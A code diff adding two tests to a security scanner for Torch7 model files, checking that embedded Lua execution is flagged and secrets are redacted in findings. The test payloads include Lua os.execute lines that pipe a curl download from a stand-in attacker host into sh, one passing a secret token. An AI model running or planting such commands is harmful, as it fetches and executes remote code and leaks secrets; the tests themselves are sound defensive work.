@@ -84,6 +84,50 @@ def test_scan_detects_lua_execution_with_network_context(tmp_path: Path) -> None
     assert execution_findings[0].severity == IssueSeverity.CRITICAL
 
 
+def test_scan_redacts_sensitive_torch7_execution_examples(tmp_path: Path) -> None:
+    secret_value = "SENSITIVEVALUE1234567890"
+    payload = (
+        b"T7\x00\x00torch.FloatTensor nn.Sequential\n"
+        + f"cmd = os.execute('curl https://evil.example/payload.sh?token={secret_value} | sh')\n".encode()
+        + f"client_secret = {secret_value}\n".encode()
+    )
+    path = _write_torch7_file(tmp_path, payload, filename="redacted.t7")
+
+    result = Torch7Scanner().scan(str(path))
+
+    serialized = repr([check.details for check in result.checks])
+    assert result.success is False
+    assert secret_value not in serialized
+    assert "token=<redacted>" in serialized
+    assert "client_secret = <redacted>" in serialized
+    assert any(
+        check.name == "Torch7 Lua Execution Primitive Analysis"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+def test_scan_preserves_benign_torch7_execution_examples(tmp_path: Path) -> None:
+    payload = (
+        b"T7\x00\x00torch.FloatTensor nn.Sequential\n"
+        b"cmd = os.execute('curl https://evil.example/public/payload.sh | sh')\n"
+    )
+    path = _write_torch7_file(tmp_path, payload, filename="benign-url.t7")
+
+    result = Torch7Scanner().scan(str(path))
+
+    execution_findings = [
+        check
+        for check in result.checks
+        if check.name == "Torch7 Lua Execution Primitive Analysis" and check.status == CheckStatus.FAILED
+    ]
+    assert len(execution_findings) == 1
+    examples = execution_findings[0].details["examples"]
+    assert any("https://evil.example/public/payload.sh" in example for example in examples)
+    assert all("<redacted>" not in example for example in examples)
+
+
 def test_scan_comment_token_does_not_suppress_lua_execution_detection(tmp_path: Path) -> None:
     payload = (
         b"T7\x00\x00torch.FloatTensor nn.Sequential\n-- decoy comment token\n"
